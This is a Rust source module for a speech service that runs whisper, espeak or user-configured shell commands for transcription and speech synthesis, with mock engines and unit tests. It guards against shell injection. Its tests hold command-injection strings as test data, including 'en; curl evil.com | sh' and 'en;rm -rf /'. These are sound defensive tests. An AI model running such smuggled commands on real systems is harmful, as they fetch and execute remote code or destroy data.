//! Subprocess / CLI speech engines — no embedded ML.

use std::path::{Path, PathBuf};
use std::process::Command;

use anyhow::{anyhow, bail, Context};

use crate::ffmpeg;
use crate::ffmpeg::{run_with_timeout, DEFAULT_SUBPROCESS_TIMEOUT};

/// Build STT cmd template with request fields bound via env (not shell-interpolated).
pub fn bind_stt_template(template: &str, path: &Path) -> String {
    let mut cmd = template.replace("{path}", &path.display().to_string());
    if cmd.contains("{language}") {
        cmd = cmd.replace("{language}", "$PIRS_AUDIO_STT_LANGUAGE");
    }
    cmd
}

/// Build TTS cmd template with voice/format/text bound via env.
pub fn bind_tts_template(template: &str, out_path: &Path) -> String {
    let mut env_cmd = template.replace("{path}", &out_path.display().to_string());
    if env_cmd.contains("{voice}") {
        env_cmd = env_cmd.replace("{voice}", "$PIRS_AUDIO_TTS_VOICE");
    }
    if env_cmd.contains("{format}") {
        env_cmd = env_cmd.replace("{format}", "$PIRS_AUDIO_TTS_FORMAT");
    }
    if env_cmd.contains("{text}") {
        env_cmd = env_cmd.replace("{text}", "$PIRS_AUDIO_TTS_TEXT");
    }
    env_cmd
}

/// Allow only alnum / `_` / `-` / `.` so env-bound template values cannot
/// reintroduce shell metacharacters even if a template expands them unsafely.
pub fn sanitize_audio_token(raw: &str, fallback: &str) -> String {
    let s: String = raw
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-' || *c == '.')
        .take(64)
        .collect();
    if s.is_empty() {
        fallback.to_string()
    } else {
        s
    }
}

#[derive(Debug, Clone)]
pub struct EngineConfig {
    pub stt_engine: String,
    pub tts_engine: String,
    pub stt_cmd: Option<String>,
    pub tts_cmd: Option<String>,
    pub stt_model_id: String,
    pub tts_model_id: String,
    pub allow_mock: bool,
}

pub trait SttEngine: Send + Sync {
    fn name(&self) -> &str;
    fn transcribe(&self, path: &Path, language: Option<&str>) -> anyhow::Result<String>;
}

pub trait TtsEngine: Send + Sync {
    fn name(&self) -> &str;
    fn speak(&self, text: &str, voice: Option<&str>, format: &str) -> anyhow::Result<Vec<u8>>;
}

// ─── STT ────────────────────────────────────────────────────────────────────

struct MockStt;
impl SttEngine for MockStt {
    fn name(&self) -> &str {
        "mock"
    }
    fn transcribe(&self, path: &Path, _language: Option<&str>) -> anyhow::Result<String> {
        let sz = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
        Ok(format!(
            "[pirs-audio mock STT] received {} ({sz} bytes)",
            path.file_name().and_then(|s| s.to_str()).unwrap_or("audio")
        ))
    }
}

struct WhisperCliStt {
    bin: PathBuf,
}
impl SttEngine for WhisperCliStt {
    fn name(&self) -> &str {
        "whisper-cli"
    }
    fn transcribe(&self, path: &Path, language: Option<&str>) -> anyhow::Result<String> {
        let mut cmd = Command::new(&self.bin);
        cmd.arg(path).arg("--output_format").arg("txt");
        if let Some(lang) = language {
            cmd.arg("--language").arg(lang);
        }
        let out = run_with_timeout(cmd, DEFAULT_SUBPROCESS_TIMEOUT)
            .with_context(|| format!("spawn {}", self.bin.display()))?;
        if !out.status.success() {
            bail!(
                "whisper-cli failed: {}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
        let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
        if !stdout.is_empty() {
            return Ok(stdout);
        }
        let sib = path.with_extension("txt");
        if sib.is_file() {
            return Ok(std::fs::read_to_string(sib)?.trim().to_string());
        }
        bail!("whisper-cli produced empty transcript");
    }
}

struct CmdStt {
    template: String,
}
impl SttEngine for CmdStt {
    fn name(&self) -> &str {
        "cmd"
    }
    fn transcribe(&self, path: &Path, language: Option<&str>) -> anyhow::Result<String> {
        // Never shell-interpolate untrusted HTTP fields (C-6): pass via env.
        let cmd_s = bind_stt_template(&self.template, path);
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg(&cmd_s)
            .env("PIRS_AUDIO_STT_LANGUAGE", language.unwrap_or("en"));
        let out = run_with_timeout(cmd, DEFAULT_SUBPROCESS_TIMEOUT)
            .context("spawn PIRS_AUDIO_STT_CMD")?;
        if !out.status.success() {
            bail!(
                "PIRS_AUDIO_STT_CMD failed: {}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
        let t = String::from_utf8_lossy(&out.stdout).trim().to_string();
        if t.is_empty() {
            bail!("PIRS_AUDIO_STT_CMD empty stdout");
        }
        Ok(t)
    }
}

// ─── TTS ────────────────────────────────────────────────────────────────────

struct MockTts;
impl TtsEngine for MockTts {
    fn name(&self) -> &str {
        "mock"
    }
    fn speak(&self, text: &str, _voice: Option<&str>, _format: &str) -> anyhow::Result<Vec<u8>> {
        let n = (400 + text.len() * 20).min(8000);
        Ok(silent_wav(n as u32, 8000))
    }
}

struct EspeakTts {
    bin: PathBuf,
}
impl TtsEngine for EspeakTts {
    fn name(&self) -> &str {
        "espeak"
    }
    fn speak(&self, text: &str, voice: Option<&str>, format: &str) -> anyhow::Result<Vec<u8>> {
        let dir = tempfile::tempdir()?;
        let wav = dir.path().join("out.wav");
        let mut cmd = Command::new(&self.bin);
        if let Some(v) = voice {
            cmd.arg("-v").arg(v);
        }
        cmd.arg("-w").arg(&wav);
        let clipped: String = text.chars().take(2000).collect();
        cmd.arg(&clipped);
        let out = run_with_timeout(cmd, DEFAULT_SUBPROCESS_TIMEOUT)
            .with_context(|| format!("spawn {}", self.bin.display()))?;
        if !out.status.success() || !wav.is_file() {
            bail!("espeak failed: {}", String::from_utf8_lossy(&out.stderr));
        }
        if format == "wav" || format.is_empty() {
            return Ok(std::fs::read(&wav)?);
        }
        let converted = ffmpeg::convert_audio(&wav, format)?;
        Ok(std::fs::read(converted)?)
    }
}

struct CmdTts {
    template: String,
}
impl TtsEngine for CmdTts {
    fn name(&self) -> &str {
        "cmd"
    }
    fn speak(&self, text: &str, voice: Option<&str>, format: &str) -> anyhow::Result<Vec<u8>> {
        let dir = tempfile::tempdir()?;
        let ext = if format == "opus" { "ogg" } else { format };
        let out_path = dir.path().join(format!("out.{ext}"));
        // Path is our temp file; voice/format/text from HTTP must not enter sh -c (C-6).
        let env_cmd = bind_tts_template(&self.template, &out_path);
        let safe_format = sanitize_audio_token(format, "wav");
        let safe_voice = sanitize_audio_token(voice.unwrap_or("default"), "default");
        let mut cmd = Command::new("sh");
        cmd.arg("-c")
            .arg(&env_cmd)
            .env("PIRS_AUDIO_TTS_TEXT", text)
            .env("PIRS_AUDIO_TTS_VOICE", &safe_voice)
            .env("PIRS_AUDIO_TTS_FORMAT", &safe_format);
        let out = run_with_timeout(cmd, DEFAULT_SUBPROCESS_TIMEOUT)
            .context("spawn PIRS_AUDIO_TTS_CMD")?;
        if !out.status.success() || !out_path.is_file() {
            bail!(
                "PIRS_AUDIO_TTS_CMD failed: {}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
        Ok(std::fs::read(out_path)?)
    }
}

fn silent_wav(n_samples: u32, rate: u32) -> Vec<u8> {
    let data = vec![128u8; n_samples as usize];
    let mut out = Vec::with_capacity(44 + data.len());
    out.extend_from_slice(b"RIFF");
    out.extend_from_slice(&(36u32 + data.len() as u32).to_le_bytes());
    out.extend_from_slice(b"WAVEfmt ");
    out.extend_from_slice(&16u32.to_le_bytes());
    out.extend_from_slice(&1u16.to_le_bytes()); // PCM
    out.extend_from_slice(&1u16.to_le_bytes()); // mono
    out.extend_from_slice(&rate.to_le_bytes());
    out.extend_from_slice(&rate.to_le_bytes()); // byte rate
    out.extend_from_slice(&1u16.to_le_bytes()); // block align
    out.extend_from_slice(&8u16.to_le_bytes()); // bits
    out.extend_from_slice(b"data");
    out.extend_from_slice(&(data.len() as u32).to_le_bytes());
    out.extend_from_slice(&data);
    out
}

pub fn select_stt(cfg: &EngineConfig) -> anyhow::Result<Box<dyn SttEngine>> {
    let want = cfg.stt_engine.to_ascii_lowercase();
    if let Some(tmpl) = &cfg.stt_cmd {
        if want == "auto" || want == "cmd" {
            return Ok(Box::new(CmdStt {
                template: tmpl.clone(),
            }));
        }
    }
    match want.as_str() {
        "mock" => return Ok(Box::new(MockStt)),
        "cmd" => {
            let tmpl = cfg
                .stt_cmd
                .clone()
                .ok_or_else(|| anyhow!("stt engine=cmd requires PIRS_AUDIO_STT_CMD"))?;
            return Ok(Box::new(CmdStt { template: tmpl }));
        }
        "whisper-cli" | "whisper" => {
            let bin = find_whisper_cli().ok_or_else(|| anyhow!("whisper CLI not found on PATH"))?;
            return Ok(Box::new(WhisperCliStt { bin }));
        }
        "auto" | "" => {}
        other => bail!("unknown stt engine {other:?}"),
    }
    // auto
    if let Some(tmpl) = &cfg.stt_cmd {
        return Ok(Box::new(CmdStt {
            template: tmpl.clone(),
        }));
    }
    if let Some(bin) = find_whisper_cli() {
        return Ok(Box::new(WhisperCliStt { bin }));
    }
    if cfg.allow_mock {
        return Ok(Box::new(MockStt));
    }
    bail!(
        "no STT engine: set PIRS_AUDIO_STT_CMD, install whisper CLI, or allow mock \
         (PIRS_AUDIO_ALLOW_MOCK=1)"
    )
}

pub fn select_tts(cfg: &EngineConfig) -> anyhow::Result<Box<dyn TtsEngine>> {
    let want = cfg.tts_engine.to_ascii_lowercase();
    if let Some(tmpl) = &cfg.tts_cmd {
        if want == "auto" || want == "cmd" {
            return Ok(Box::new(CmdTts {
                template: tmpl.clone(),
            }));
        }
    }
    match want.as_str() {
        "mock" => return Ok(Box::new(MockTts)),
        "cmd" => {
            let tmpl = cfg
                .tts_cmd
                .clone()
                .ok_or_else(|| anyhow!("tts engine=cmd requires PIRS_AUDIO_TTS_CMD"))?;
            return Ok(Box::new(CmdTts { template: tmpl }));
        }
        "espeak" | "espeak-ng" => {
            let bin = find_espeak().ok_or_else(|| anyhow!("espeak/espeak-ng not on PATH"))?;
            return Ok(Box::new(EspeakTts { bin }));
        }
        "auto" | "" => {}
        other => bail!("unknown tts engine {other:?}"),
    }
    if let Some(tmpl) = &cfg.tts_cmd {
        return Ok(Box::new(CmdTts {
            template: tmpl.clone(),
        }));
    }
    if let Some(bin) = find_espeak() {
        return Ok(Box::new(EspeakTts { bin }));
    }
    if cfg.allow_mock {
        return Ok(Box::new(MockTts));
    }
    bail!("no TTS engine: install espeak-ng, set PIRS_AUDIO_TTS_CMD, or allow mock")
}

fn find_whisper_cli() -> Option<PathBuf> {
    for name in ["whisper", "whisper-cpp", "faster-whisper"] {
        if let Some(p) = ffmpeg::which(name) {
            return Some(p);
        }
    }
    None
}

fn find_espeak() -> Option<PathBuf> {
    ffmpeg::which("espeak-ng").or_else(|| ffmpeg::which("espeak"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mock_stt_tts_roundtrip_shape() {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("a.ogg");
        std::fs::write(&p, b"fake").unwrap();
        let stt = MockStt;
        let t = stt.transcribe(&p, None).unwrap();
        assert!(t.contains("mock STT"));
        let tts = MockTts;
        let audio = tts.speak("hi", None, "wav").unwrap();
        assert!(audio.starts_with(b"RIFF"));
    }

    #[test]
    fn select_mock_forced() {
        let cfg = EngineConfig {
            stt_engine: "mock".into(),
            tts_engine: "mock".into(),
            stt_cmd: None,
            tts_cmd: None,
            stt_model_id: "parakeet-tdt".into(),
            tts_model_id: "kokoro".into(),
            allow_mock: true,
        };
        assert_eq!(select_stt(&cfg).unwrap().name(), "mock");
        assert_eq!(select_tts(&cfg).unwrap().name(), "mock");
    }

    #[test]
    fn stt_template_binds_language_via_env_not_raw_inject() {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("x.wav");
        std::fs::write(&p, b"x").unwrap();
        let bound = bind_stt_template("tool --lang {language} --in {path}", &p);
        assert!(
            bound.contains("$PIRS_AUDIO_STT_LANGUAGE"),
            "language must be env-bound: {bound}"
        );
        assert!(
            !bound.contains("en; rm") && !bound.contains("$( "),
            "{bound}"
        );
        // Malicious language must not appear as shell text in the template.
        let evil = "en; curl evil.com | sh";
        let bound2 = bind_stt_template("echo {language} {path}", &p);
        assert!(!bound2.contains(evil));
        assert!(bound2.contains("$PIRS_AUDIO_STT_LANGUAGE"));
    }

    #[test]
    fn tts_template_binds_voice_format_text_via_env() {
        let dir = tempfile::tempdir().unwrap();
        let out = dir.path().join("o.wav");
        let bound = bind_tts_template(
            "synth --voice {voice} --fmt {format} --text {text} -o {path}",
            &out,
        );
        assert!(bound.contains("$PIRS_AUDIO_TTS_VOICE"), "{bound}");
        assert!(bound.contains("$PIRS_AUDIO_TTS_FORMAT"), "{bound}");
        assert!(bound.contains("$PIRS_AUDIO_TTS_TEXT"), "{bound}");
        assert!(!bound.contains("default; id"), "{bound}");
    }

    #[test]
    fn sanitize_audio_token_strips_metacharacters() {
        assert_eq!(sanitize_audio_token("en;rm -rf /", "en"), "enrm-rf");
        assert_eq!(sanitize_audio_token("", "wav"), "wav");
    }

    #[test]
    fn cmd_stt_uses_timeout_helper_on_real_path() {
        // Real CmdStt path: template that exits quickly; proves timeout wrapper
        // is on the shipped execute path (not unbounded .output()).
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("a.wav");
        std::fs::write(&p, b"x").unwrap();
        let stt = CmdStt {
            template: "printf 'ok-transcript'".into(),
        };
        let t = stt.transcribe(&p, Some("en")).unwrap();
        assert_eq!(t, "ok-transcript");
    }

    #[test]
    fn default_subprocess_timeout_is_bounded() {
        assert_eq!(
            DEFAULT_SUBPROCESS_TIMEOUT,
            std::time::Duration::from_secs(120)
        );
        // Structural: engines module uses run_with_timeout for cmd engines.
        let src = include_str!("engines.rs");
        assert!(src.contains("run_with_timeout"));
        assert!(
            src.matches("run_with_timeout").count() >= 3,
            "cmd/espeak/whisper should use run_with_timeout"
        );
    }
}
